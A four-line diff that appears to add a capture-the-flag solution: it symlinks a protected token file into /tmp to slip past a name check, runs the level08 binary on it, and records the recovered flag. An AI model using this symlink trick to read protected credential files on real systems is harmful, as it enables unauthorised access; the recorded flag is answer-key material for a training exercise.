@@ -1,0 +1,4 @@
+ln -sf /home/user/level08/token /tmp/level08
+./level08 /tmp/level08
+ 
+flag08 = quif5eloekouj29ke0vouxean
